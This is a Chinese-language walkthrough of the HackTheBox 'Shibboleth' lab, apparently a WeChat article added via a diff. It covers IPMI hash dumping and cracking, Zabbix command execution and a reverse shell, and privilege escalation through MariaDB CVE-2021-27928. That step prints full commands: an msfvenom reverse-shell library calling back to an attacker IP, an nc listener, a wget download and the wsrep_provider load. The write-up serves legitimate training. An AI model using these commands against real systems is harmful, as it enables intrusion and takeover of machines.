@@ -1,0 +1,243 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/T80lR81T1if-I8ITr_0HMg)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia84GacYwfYUEb8Ldv0H2azDz0YViaSFhpRGaMLCXAZ9iaq6wicFOyrLiafT4IBlxHTD8ylYic1HbfdZuib5A/640?wx_fmt=png)
+
+**特别声明:**
+
+点此亲启
+
+**致各位**
+
+· 本公众号发布的靶场、文章项目中涉及的任何脚本工具，仅用于测试和学习研究，禁止用于商业用途，不能保证其合法性，准确性，完整性和有效性，请根据情况自行判断；
+
+· 本文章、项目内靶场所有资源文件，禁止任何公众号、自媒体进行任何形式的擅自转载、发布
+
+· PTEHUB 对任何脚本及工具问题概不负责，包括不限于由任何脚本错误导致的任何损失或损害及任何法律责任；
+
+· 间接使用靶场、文章中的任何工具及技术，包括但不限于建立 VPS 或在某些行为违反国家 / 地区法律或相关法规的情况下进行传播, PTEHUB 对于由此引起的任何隐私泄漏或其他法律问题后果概不负责；
+
+· 如果任何单位或个人认为该项目或文章的脚本可能涉嫌侵犯其权利，则应及时通知并提供身份证明，所有权证明，我们将在收到认证文件后删除相关内容；
+
+· 以任何方式查看或使用此项目的人或直接或间接使用项目的任何脚本的使用者都应仔细阅读此声明；
+
+· PTEHUB 保留随时更改或补充此免责声明的权利；
+
+· 一旦使用访问 PTEHUB 项目，则视为您已接受此免责声明。
+
+您在本声明未发出之时，使用或者访问了 PTEHUB ，则视为已接受此声明，请仔细阅读。  
+
+此致
+
+  
+
+  
+
+  
+
+![](https://mmbiz.qpic.cn/mmbiz_svg/6t0VDe9bl5c19UhCoAqSJsbGVFE2AGkehUSwIJ80rLG7sicu1ibhEU9qTmG3WlBXLhTia05DLPKcq5lCaqWqXX5LXAdtVAQocxw/640?wx_fmt=svg)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia87diauw7JFeflsqdArF4ZcMrTZIBIWkICERBt50hUJn0NShfWNj6bmuxr75XdcOic0498gbteJ99gfg/640?wx_fmt=png)
+
+元旦期间开启了内卷模式，有一句话叫做: 你要偷偷努力, 然后惊艳所有人。换在今日的流行意思就是————偷偷的自己内卷，然后把其他人卷 si😄！
+
+今天给大家带来的是 HTB shibboleth 靶场的操作说明，在 HTB 的难度中属于 Medium
+
+1
+
+**探测靶机**
+
+首先利用 Nmap 扫描开放端口及服务，发现了 80，623 这两个端口
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia84GacYwfYUEb8Ldv0H2azDzQXXHCichLyg6KF9UqdpocLaLfF2JGfvwLhsJ3LNgBHOS9G1qd4RMhGw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia84GacYwfYUEb8Ldv0H2azDzicX3S69nvUuMn8Kux4pFiaQ8BT1kb96nggIgAug6gS4icgbIiaPLoGuZhA/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia879QGicniaZ3sByZ75cDtOBr0mGsibicvImy7HB1NBibsWQEZAO5ziaW7zPWUScXaIjBeWlx7fyJcAWshng/640?wx_fmt=png)
+
+将我们扫到的域名，加入 etc/hosts 内然后正常访问
+
+  
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia879QGicniaZ3sByZ75cDtOBr048b2Yia47bbCz7yyzBJY0Kq5xiaDP1kAPgNHS0wCpmxuQuSQtZqdJbtA/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia879QGicniaZ3sByZ75cDtOBr06doD5G72jymKGgdbicxA4lRACUszt5sLkkXGngAwE7UunM0J97cib5jw/640?wx_fmt=png)
+
+从页面上没有找到突破口，然后回头去看了下这个 udp 的 623 端口，Google 了一下发现有公开的 Exp，并且 Msf 里面也有。
+
+参考链接：
+
+https://book.hacktricks.xyz/pentesting/623-udp-ipmi
+
+进行检测发现存在漏洞，然后利用配套的 Hashdump，将 Hashdump 出来以后进行爆破  
+
+  
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia84GacYwfYUEb8Ldv0H2azDz3sXNs6YfCNwOAJRWM7wEcGppydc3Q68PNwhrVD8jCX16j5wTeiaU4TQ/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia84GacYwfYUEb8Ldv0H2azDzB3q8Og2PJCef8Pib8lXyic92MLicb3greRlicvOza3EttYRxNACovHiaichg/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia84GacYwfYUEb8Ldv0H2azDzUOEv59ELBWmM67OruFK7EeMLhDojS0LYm3l5s7iaCiaIQQ1oK1vrQTBA/640?wx_fmt=png)
+
+2
+
+**Shell**
+
+接下来使用得到的账号密码进行登陆
+
+User：Administrator
+
+Passwd：ilovepumkinpie1
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia879QGicniaZ3sByZ75cDtOBr0icHyqb79K0ibic0wOFciaIvIXib89bGG10X5RibNMOZXDyRoZ5Ved7wPhTcQ/640?wx_fmt=png)
+
+  
+
+在查了很多资料以后发现
+
+Configuration->Hosts->shibboleth.htb->items 这里新建的时候可以进行命令执行
+
+参考链接如下：
+
+https://www.zabbix.com/documentation/current/en/manual/config/items/itemtypes/zabbix_agent
+
+https://sbcode.net/zabbix/agent-execute-python/
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia879QGicniaZ3sByZ75cDtOBr0vPWNa2q4ZIYsTJV84EfeNI0tLjuHquwhMXMibK8dB8ZSK4LlDOWnicHw/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia879QGicniaZ3sByZ75cDtOBr0KchO1LAdPEvxJopuA95EJTebgRtKTuicRgMsrQbQIibXLMndSicAY5MyQ/640?wx_fmt=png)
+
+快乐就是如此简单！
+
+3
+
+Reverse Shell：
+
+这里直接在输入框里面反弹一个 shell 回来
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia879QGicniaZ3sByZ75cDtOBr06doPicnzDMb0rfaw6j2clkkXVc12CCOnjaNE0D0FE353JU9ub9NChrg/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia879QGicniaZ3sByZ75cDtOBr0GqyRf0UibCerN9auptiaSKxQ71DAIbBFIxGUyyZj27T0k4bg3fZVuiclg/640?wx_fmt=png)
+
+  
+
+对得起掉在桌上的头发了！  
+
+4
+
+**信息搜集：**
+
+查看了下有哪些用户，尝试密码复用，结果居然成了～
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia879QGicniaZ3sByZ75cDtOBr0Sx5ELUiamE7bq0XyMawLicfZf4E88unfkds6ibTnYmadWprBPB6hJpUng/640?wx_fmt=png)
+
+还是很友好的嘛，换个交互更好的终端
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia879QGicniaZ3sByZ75cDtOBr0kdY0Ziap557Vy1uXCQYOAhKr1solib8OavJ6x1PwbN7Mv4B8PBMiazKLQ/640?wx_fmt=png)
+
+找到了 user.txt ，获取到了普通权限的 flag，接下来提权去找 root 的 flag
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia879QGicniaZ3sByZ75cDtOBr0TgI5lec8064yURqL5qdQjYrbd9ppcVbJkK2LiaderXvBR4HFicBAhO9Q/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia879QGicniaZ3sByZ75cDtOBr0d4RaicYYo8PUJLLfNrA5pDa6lzcWXmPxLce9ItN2nAHGOIkHydhR83A/640?wx_fmt=png)
+
+5
+
+**提权：**
+
+在翻垃圾的时候发现了 Zabbix 的数据库密码
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia879QGicniaZ3sByZ75cDtOBr0ojiayHqrZ7v21f37fNP0IoxoHJ2CIURH0K6eyWyFadxic4Tjiak8TmicEQ/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia879QGicniaZ3sByZ75cDtOBr0VU4Bj0Rr8wRTwlUpY86bacex2EnwgrJWgGpwnc1daickgD5p0njP4Rg/640?wx_fmt=png)
+
+  
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia879QGicniaZ3sByZ75cDtOBr0FQlpiabcqUyMnO3grdP1ZEBfLSNjibrxics51cj0icEXgQ2dCRPaYTlIiag/640?wx_fmt=png)
+
+  
+
+  
+
+这个 MairaDB 的版本是有漏洞的，可以直接提权
+
+CVE-2021-27928
+
+参考链接：  
+
+https://github.com/Al1ex/CVE-2021-27928
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia879QGicniaZ3sByZ75cDtOBr0cBEXia8b1TgXceLhbAuzGYVy2geWQNkauJhyW9DLVueyVWib7YHS7lrQ/640?wx_fmt=png)
+
+  
+
+1. 使用 Msf 生成一个. so 的文件
+
+```
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.28 LPORT=9999 -f elf-so -o PTEHub.so
+```
+
+2. 使用 NC 监听一个端口
+
+```
+nc -nvlp 9999
+```
+
+3. 将文件上传到靶机的 / tmp 目录下
+
+```
+python3 -m http.server 8888
+```
+
+切换至 /tmp
+
+```
+wget http://10.10.14.28:8888/PTEHub.so
+```
+
+4. 登录 mysql 然后执行文件
+
+```
+SET GLOBAL wsrep_provider="/tmp/PTEHub.so";
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia879QGicniaZ3sByZ75cDtOBr0rShBFoFXSFWDwTKRVmM5eaIkhic6uS33k6DeXLeG6f4pG4UshxfLfjg/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia879QGicniaZ3sByZ75cDtOBr083xtiaBzXLnAuMS7eFpLJeTPhRk3tNBheEnRDJJEibJoTWySibdXkBfSw/640?wx_fmt=png)
+
+  
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia879QGicniaZ3sByZ75cDtOBr06IWN1DDFqvCpMtrbGoccIuy4YdmWD8CXSJibmFWicR9IxNvRjZpzx9Kg/640?wx_fmt=png)
+
+6
+
+**总结**
+
+思路：
+
+该靶场官方定位为中等级别，不是很难，主要还是对端口服务、应用系统以及中间件的漏洞进行利用；通过端口漏洞拿到 hash 再进行爆破 hash，然后利用 zabbix 的漏洞进行反弹 shell，最后再通过数据库进行提权。
+
+工具：
+
+Nmap: 可以检测目标机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息；
+
+MSF: 一个漏洞框架。它的全称叫做 The Metasploit Framework，简称 MSF；
+
+HashCat: 号称是史上最快的密码破解工具；
+
+FFUF: 模糊测试工具；
+
+Netcat: 实用的网络测试工具，简称 Nc。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia87diauw7JFeflsqdArF4ZcMrTZIBIWkICERBt50hUJn0NShfWNj6bmuxr75XdcOic0498gbteJ99gfg/640?wx_fmt=png)
+
+* * *
+
+**本期制作**
+
+作者：Shawn_bot
+
+编辑：0x3135、邹一
+
+审核：墨鱼
+
+       点击下方名片关注我们～
+
+公众号
